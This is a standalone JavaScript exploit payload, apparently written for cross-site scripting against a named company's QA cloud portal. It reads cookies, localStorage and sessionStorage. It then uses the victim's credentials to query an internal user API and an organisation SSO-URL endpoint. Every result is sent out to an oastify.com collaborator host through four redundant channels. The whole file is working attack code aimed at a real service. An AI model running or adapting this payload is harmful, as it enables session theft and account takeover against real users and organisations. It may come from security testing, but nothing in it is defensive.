const collaborator = 'https://u3y701j6zmu091cehngccvx9l0rrfk39.oastify.com';

// Collect all accessible data
const collectData = async () => {
    const data = {
        cookies: document.cookie,
        origin: window.location.origin,
        userAgent: navigator.userAgent,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        timestamp: new Date().toISOString(),
        url: window.location.href
    };

    // Step 1: Access internal API to get CID
    try {
        const userResponse = await fetch('https://qa-us-east-1-srv-7.cloud.cambiumnetworks.com/VCT_CTH31/cn-srv/user/me', {
            credentials: 'include',
            headers: { 
                'Accept': 'application/json',
                'Content-Type': 'application/json'
            }
        });
        
        if (userResponse.ok) {
            const userData = await userResponse.json();
            data.internalApi = userData;
            data.internalStatus = 'SUCCESS';
            
            // Extract CID from response
            if (userData.cid) {
                data.cid = userData.cid;
                
                // Step 2: Use CID to request SSO URL
                try {
                    const ssoUrl = `https://qa.cloud.cambiumnetworks.com/cn-rtr/organizations/${userData.cid}/sso-url`;
                    const ssoResponse = await fetch(ssoUrl, {
                        credentials: 'include',
                        headers: { 
                            'Accept': 'application/json',
                            'Content-Type': 'application/json'
                        }
                    });
                    
                    if (ssoResponse.ok) {
                        const ssoData = await ssoResponse.json();
                        data.ssoResponse = ssoData;
                        data.ssoStatus = 'SUCCESS';
                        data.ssoUrl = ssoUrl;
                    } else {
                        data.ssoStatus = `FAILED: ${ssoResponse.status}`;
                        data.ssoUrl = ssoUrl;
                    }
                } catch (ssoError) {
                    data.ssoStatus = `ERROR: ${ssoError.message}`;
                    data.ssoUrl = ssoUrl;
                }
            } else {
                data.cidStatus = 'CID_NOT_FOUND';
            }
        } else {
            data.internalStatus = `FAILED: ${userResponse.status}`;
        }
    } catch (error) {
        data.internalStatus = `ERROR: ${error.message}`;
    }
    
    return data;
};

// Multiple exfiltration methods
const exfiltrate = (data) => {
    const jsonData = JSON.stringify(data, null, 2);
    
    console.log('Exfiltrating data:', data);
    
    // Method 1: sendBeacon (no CORS issues)
    navigator.sendBeacon(`${collaborator}/beacon`, jsonData);
    
    // Method 2: Image (no CORS)
    const imgData = btoa(encodeURIComponent(jsonData));
    new Image().src = `${collaborator}/img?data=${imgData}`;
    
    // Method 3: Fetch with no-cors
    fetch(`${collaborator}/fetch`, {
        method: 'POST',
        mode: 'no-cors',
        body: jsonData
    });
    
    // Method 4: Additional GET request with data in URL
    fetch(`${collaborator}/get?data=${encodeURIComponent(JSON.stringify(data))}`, {
        mode: 'no-cors'
    });
};

// Execute with error handling
collectData().then(exfiltrate).catch(error => {
    // Send error information to collaborator
    const errorData = {
        error: error.message,
        timestamp: new Date().toISOString(),
        url: window.location.href
    };
    exfiltrate(errorData);
});
